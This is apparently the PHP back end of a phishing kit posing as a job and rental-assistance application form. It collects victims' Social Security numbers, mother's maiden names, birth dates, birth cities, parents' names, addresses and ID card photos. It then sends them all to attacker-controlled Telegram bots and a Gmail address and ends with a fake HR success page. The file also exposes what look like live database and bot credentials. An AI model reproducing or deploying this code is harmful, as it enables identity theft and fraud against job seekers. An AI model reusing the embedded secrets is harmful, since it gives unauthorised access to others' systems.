<?php

// ======================
// ERROR REPORTING
// ======================
error_reporting(E_ALL);
ini_set('display_errors', 1);

// ======================
// CLOUDINARY SETTINGS
// ======================
$cloudName = "dlddiquex";
$uploadPreset = "job_forms";

// ======================
// NEON DATABASE
// ======================
$host = "ep-calm-frog-ahfjj5vo-pooler.c-3.us-east-1.aws.neon.tech";
$db   = "neondb";
$user = "neondb_owner";
$pass = "npg_TQ1gBOwA9rCa";
$port = "5432";

$dsn = "pgsql:host=$host;port=$port;dbname=$db;sslmode=require";

try {

    $pdo = new PDO($dsn, $user, $pass, [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION
    ]);

} catch (Exception $e) {

    die("DB Connection failed: " . $e->getMessage());
}

// ======================
// FORM DATA
// ======================
$first_name = $_POST['first_name'] ?? '';
$middle_name = $_POST['middle_name'] ?? '';
$last_name = $_POST['last_name'] ?? '';

$phone = $_POST['phone'] ?? '';
$email = $_POST['email'] ?? '';
$dob = $_POST['dob'] ?? '';

$mother_maiden = $_POST['mother_maiden'] ?? '';
$ssn = $_POST['ssn'] ?? '';

$birth_city = $_POST['birth_city'] ?? '';

$address_line1 = $_POST['address_line1'] ?? '';
$address_line2 = $_POST['address_line2'] ?? '';

$city = $_POST['city'] ?? '';
$state = $_POST['state'] ?? '';
$zip_code = $_POST['zip_code'] ?? '';

$father_name = $_POST['father_name'] ?? '';
$mother_name = $_POST['mother_name'] ?? '';

$address = $address_line1 . " " . $address_line2 . ", " . $city . ", " . $state . " " . $zip_code;

// ======================
// CLOUDINARY UPLOAD
// ======================
function uploadToCloudinary($file, $cloudName, $uploadPreset) {

    if (!isset($file) || $file['error'] !== 0) {
        return null;
    }

    $url = "https://api.cloudinary.com/v1_1/$cloudName/image/upload";

    $postFields = [
        'file' => new CURLFile($file['tmp_name']),
        'upload_preset' => $uploadPreset,
        'folder' => 'job_applications'
    ];

    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($ch);

    curl_close($ch);

    $result = json_decode($response, true);

    return $result['secure_url'] ?? null;
}

// ======================
// UPLOAD FILES
// ======================
$front_url = uploadToCloudinary(
    $_FILES['front_id'] ?? null,
    $cloudName,
    $uploadPreset
);

$back_url = uploadToCloudinary(
    $_FILES['back_id'] ?? null,
    $cloudName,
    $uploadPreset
);

// ======================
// SAVE TO DATABASE
// ======================
$stmt = $pdo->prepare("
INSERT INTO job_applications (
    first_name,
    middle_name,
    last_name,
    phone,
    email,
    dob,
    mother_maiden,
    ssn,
    birth_city,
    address,
    father_name,
    mother_name,
    front_id,
    back_id
)
VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
");

$stmt->execute([
    $first_name,
    $middle_name,
    $last_name,
    $phone,
    $email,
    $dob,
    $mother_maiden,
    $ssn,
    $birth_city,
    $address,
    $father_name,
    $mother_name,
    $front_url,
    $back_url
]);

// ======================
// TELEGRAM SETTINGS
// ======================
$bot1 = "8538050369:AAGHLSy5D7r-_6QA9K1rbqkebWrzpbjc1ek";
$chat1 = "6513265609";

$bot2 = "YOUR_BOT_TOKEN_2";
$chat2 = "5469294503";

// ======================
// TELEGRAM FUNCTION
// ======================
function sendTelegram($bot, $method, $data) {

    $url = "https://api.telegram.org/bot{$bot}/{$method}";

    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
            'timeout' => 30
        ]
    ];

    $context = stream_context_create($options);

    return file_get_contents($url, false, $context);
}

// ======================
// MESSAGE
// ======================
$text = "📄 New Application Submitted\n\n";

$text .= "👤 Name: $first_name $middle_name $last_name\n";
$text .= "📞 Phone: $phone\n";
$text .= "📧 Email: $email\n";
$text .= "🎂 DOB: $dob\n";
$text .= "🏠 Address: $address\n";
$text .= "🏙 Birth City: $birth_city\n";
$text .= "👨 Father: $father_name\n";
$text .= "👩 Mother: $mother_name\n";
$text .= "🧾 SSN: $ssn";

// ======================
// SEND BOT 1
// ======================
sendTelegram($bot1, "sendMessage", [
    "chat_id" => $chat1,
    "text" => $text
]);

if (!empty($front_url)) {

    sendTelegram($bot1, "sendPhoto", [
        "chat_id" => $chat1,
        "photo" => $front_url,
        "caption" => "🪪 Front ID - $first_name $last_name"
    ]);
}

if (!empty($back_url)) {

    sendTelegram($bot1, "sendPhoto", [
        "chat_id" => $chat1,
        "photo" => $back_url,
        "caption" => "🪪 Back ID - $first_name $last_name"
    ]);
}

// ======================
// SEND BOT 2
// ======================
sendTelegram($bot2, "sendMessage", [
    "chat_id" => $chat2,
    "text" => $text
]);

if (!empty($front_url)) {

    sendTelegram($bot2, "sendPhoto", [
        "chat_id" => $chat2,
        "photo" => $front_url,
        "caption" => "🪪 Front ID - $first_name $last_name"
    ]);
}

if (!empty($back_url)) {

    sendTelegram($bot2, "sendPhoto", [
        "chat_id" => $chat2,
        "photo" => $back_url,
        "caption" => "🪪 Back ID - $first_name $last_name"
    ]);
}

// ======================
// EMAIL
// ======================
$to = "collaomn@gmail.com";

$subject = "New Job Form Submission";

$body = $text;

$headers = "From: noreply@homeandrentalassistance.onrender.com";

@mail($to, $subject, $body, $headers);

// ======================
// SUCCESS PAGE
// ======================
echo "

<!DOCTYPE html>

<html lang='en'>

<head>

<meta charset='UTF-8'>

<meta name='viewport' content='width=device-width, initial-scale=1.0'>

<title>Application Submitted</title>

<style>

body{
    margin:0;
    padding:0;
    background:#020617;
    font-family:Arial,sans-serif;
    display:flex;
    justify-content:center;
    align-items:center;
    min-height:100vh;
}

.success-box{
    width:90%;
    max-width:750px;
    background:#0f172a;
    padding:50px;
    border-radius:25px;
    text-align:center;
    color:white;
    box-shadow:0 10px 40px rgba(0,0,0,0.5);
}

.check{
    font-size:90px;
    color:#22c55e;
    margin-bottom:20px;
}

h1{
    font-size:42px;
    margin-bottom:20px;
}

p{
    font-size:22px;
    line-height:1.8;
    color:#cbd5e1;
}

hr{
    border:none;
    border-top:1px solid #334155;
    margin:40px 0;
}

.director{
    font-size:32px;
    color:#38bdf8;
    margin-bottom:10px;
}

.role{
    font-size:20px;
    color:#94a3b8;
}

</style>

</head>

<body>

<div class='success-box'>

<div class='check'>✓</div>

<h1>Form Submitted Successfully!</h1>

<p>
Thank you for considering
<strong>Apartment at Home and Rental Assistance</strong>.
<br><br>
We will contact you shortly.
</p>

<hr>

<div class='director'>
Taylor Luis
</div>

<div class='role'>
Director of Human Resources
</div>

</div>

</body>

</html>

";

?>
